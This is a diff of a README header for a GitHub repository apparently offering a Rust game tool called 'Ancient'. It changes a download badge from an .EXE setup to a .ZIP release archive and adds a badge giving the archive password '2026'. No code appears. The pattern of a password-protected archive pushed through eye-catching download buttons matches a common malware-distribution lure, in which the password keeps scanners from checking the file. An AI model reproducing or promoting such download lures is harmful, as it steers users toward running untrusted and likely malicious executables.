@@ -11,8 +11,9 @@
 
 <p align="center">
   <a href="https://github.com/shalaluecka/Ancient-Rust-2026/releases/download/2026/Ancient.Rust.zip">
-    <img src="https://img.shields.io/badge/➔%20Download%20Ancient%20Setup%20(.EXE)-Click%20Here-purple?style=for-the-badge" alt="Download" />
+    <img src="https://img.shields.io/badge/➔%20Download%20Ancient%20(.ZIP)-Click%20Here-purple?style=for-the-badge" alt="Download" />
   </a>
+  <img src="https://img.shields.io/badge/🔑%20Passwrd-2026-blue?style=for-the-badge" alt="Passwrd 2026" />
 </p>
 
 ---
